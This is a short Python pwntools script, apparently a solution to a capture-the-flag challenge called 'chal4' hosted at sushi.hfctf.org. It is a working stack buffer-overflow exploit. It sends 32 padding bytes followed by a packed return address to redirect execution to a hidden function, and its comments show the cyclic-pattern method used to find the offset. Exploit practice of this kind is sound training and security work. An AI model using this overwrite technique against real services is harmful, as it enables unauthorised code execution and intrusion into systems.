#! /usr/bin/python2.7
# -*- coding: utf-8 -*-

from pwn import *

p = remote('sushi.hfctf.org','1234')
#to attach gdbwith
#p = process('chal4')
#gdb.attach(p)
print(p.recv())
#p.sendline(cyclic(200))
#result 0x61616169
#cyclic_find(0x61616169)
#32
# begin secret address: 0x08048689
p.sendline("A"*32+p32(0x08048688))
print(p.recv())
print(p.recv())
# never fogert this
# without this you can debug the program
# because we use a Python script to execute the program
# The program chal4 will be deleted on the memory when he ended
# https://reverseengineering.stackexchange.com/questions/15204/why-cant-gdb-read-memory-if-pwntools-is-used-to-send-input
#p.interactive()